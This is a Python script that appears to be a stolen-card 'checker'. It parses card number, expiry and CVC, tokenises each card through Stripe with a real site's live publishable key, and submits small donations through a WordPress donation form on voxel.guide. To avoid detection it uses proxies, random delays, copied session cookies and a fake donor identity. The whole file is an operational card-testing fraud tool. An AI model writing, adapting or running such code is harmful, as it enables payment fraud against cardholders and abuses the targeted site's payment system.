import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))

##REQ1 
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=3e80710a-41ab-40fc-a99f-55ed21ad64e7d48e4f&sid=2929c5b4-fd61-4b4d-9e62-616e4c567562d6a0b6&pasted_fields=number&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+card-element&referrer=https%3A%2F%2Fvoxel.guide&time_on_page=122365&key=pk_live_51NpwDuJJGU2OiPGJ2vcO9MXONIWXVQJHRPyUKQMAYHFirXW8JvIEhN12Y6fRhdN7P7Ta5VDHtNvQgDfxtQsmmEyJ00BBJ1SMsl'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
        	id = response.json()['id']
        except:
        	pass
        
        
        cookies = {
            '_ga': 'GA1.1.440936206.1732811776',
            'unique_session_id': 'd566578f-e254-46f8-a64e-8cc0a43090be',
            '__stripe_mid': '3e80710a-41ab-40fc-a99f-55ed21ad64e7d48e4f',
            '__stripe_sid': '2929c5b4-fd61-4b4d-9e62-616e4c567562d6a0b6',
            '_ga_6CGSWZ92TV': 'GS1.1.1732811775.1.1.1732811898.0.0.0',
        }
        
        headers = {
            'authority': 'voxel.guide',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.1.440936206.1732811776; unique_session_id=d566578f-e254-46f8-a64e-8cc0a43090be; __stripe_mid=3e80710a-41ab-40fc-a99f-55ed21ad64e7d48e4f; __stripe_sid=2929c5b4-fd61-4b4d-9e62-616e4c567562d6a0b6; _ga_6CGSWZ92TV=GS1.1.1732811775.1.1.1732811898.0.0.0',
            'origin': 'https://voxel.guide',
            'referer': 'https://voxel.guide/donate/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1732811900521',
        }
        
        data = {
            'data': f'__fluent_form_embded_post_id=1499&_fluentform_3_fluentformnonce=34e4aedcb3&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Khant%20Ti&names%5Blast_name%5D=Kyi&email=thur07656%40gmail.com&payment_input=Other&custom-payment-amount=5&description=&payment_method=stripe&gdpr-agreement=on&alt_s=&jidwsv1379=629289&item__3__fluent_checkme_=&__stripe_payment_method_id={id}',
            'action': 'fluentform_submit',
            'form_id': '3',
        }
        r2 = requests.post('https://voxel.guide/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
